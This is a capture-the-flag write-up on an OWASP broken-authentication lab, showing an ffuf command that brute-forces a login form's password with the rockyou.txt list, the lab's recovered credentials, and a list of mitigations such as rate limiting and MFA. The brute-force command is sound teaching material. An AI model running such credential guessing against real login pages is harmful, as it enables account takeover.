# A2 - Broken Authentication (Brute Force)

OWASP Top 10 (2017) vulnerability. The login form has no rate limiting or attempt blocking, allowing credentials to be guessed via brute force. The form itself provides a user hint through a Marvin image.

---

## Steps to Obtain the Flag

### 1. Identify the Vector

Login is performed via GET with this structure:
```
http://<IP>/?page=signin&username={username}&password={password}&Login=Login#
```

The Marvin image in the form suggests the user: `marvin`.

### 2. Brute Force with ffuf

Using the `rockyou.txt` dictionary, all attempts return HTTP 200, so we filter by response size (`-fs`) to identify the correct login:

```bash
ffuf -w rockyou.txt \
     -u "http://<IP>/?page=signin&username=marvin&password=FUZZ&Login=Login" \
     -fs 1990
```

The valid password is: **`shadow`**

### 3. Login and Obtain the Flag

Credentials:
- **Username:** `marvin`
- **Password:** `shadow`

Log in → the application displays the **flag**.

---

## Impact

- **Weak/Predictable Credentials:** user deducible from the interface and password in common dictionary.
- **No Rate Limiting:** allows thousands of attempts without restriction.
- **No Progressive Blocking:** no defense against repeated attempts.

---

## Mitigation

1. **Rate Limiting:** limit login attempts per IP/user in a time window.
2. **Progressive Blocking:** backoff or lockout after several failed attempts.
3. **Robust Password Policy:** prohibit common passwords or those in leaked dictionaries.
4. **MFA:** reduce impact even if password is compromised.
5. **Don't Reveal Users in the Interface:** avoid visual hints or text indicating valid users.
6. **Logging and Alerts:** detect and alert on massive login attempts.
